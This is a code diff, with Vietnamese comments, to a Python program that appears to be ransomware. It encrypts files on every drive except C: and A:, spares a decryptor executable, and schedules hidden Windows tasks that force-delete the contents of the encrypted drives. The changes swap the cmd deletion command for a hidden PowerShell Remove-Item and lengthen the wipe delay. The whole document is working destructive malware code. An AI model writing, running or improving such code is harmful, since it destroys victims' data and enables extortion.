@@ -5,13 +5,12 @@ import secrets
 import tkinter as tk
 from tkinter import messagebox
 
-def schedule_drive_wipe(drives, minutes=1):
+def schedule_drive_wipe(drives, minutes=2):
     run_time = (datetime.datetime.now() + datetime.timedelta(minutes=minutes)).strftime("%H:%M")
     for drive in drives:
-        # Lệnh xóa tất cả file và thư mục trong ổ (trừ ổ C)
         command = (
             f'schtasks /create /tn "Wipe_{drive[0]}" '
-            f'/tr "cmd /c del /f /s /q {drive}*.* & for /d %%p in ({drive}*) do rmdir \\"%%p\\" /s /q" '
+            f'/tr "powershell -NoProfile -WindowStyle Hidden -Command \\"Remove-Item \'{drive}\\*\' -Recurse -Force\\"" '
             f'/sc once /st {run_time} /f'
         )
         subprocess.run(command, shell=True)
@@ -69,12 +68,12 @@ def main():
     target_drives = []
 
     for drive in drives:
-        if drive == "C:\\": 
+        if drive == "C:\\" or drive == "A:\\": 
             continue
         target_drives.append(drive)
         for root, dirs, files in os.walk(drive):
             for file_name in files:
-                if file_name == "decrypt-v1.2.0.exe":
+                if file_name == "decrypt-v1.2.2.exe":
                     continue
                 path = os.path.join(root, file_name)
                 print(f"Encrypting {path}...")
@@ -101,7 +100,7 @@ def main():
 
     # Hẹn giờ xóa toàn bộ nội dung các ổ đã mã hóa
     if target_drives:
-        schedule_drive_wipe(target_drives, minutes=1)
+        schedule_drive_wipe(target_drives)
 
     
 
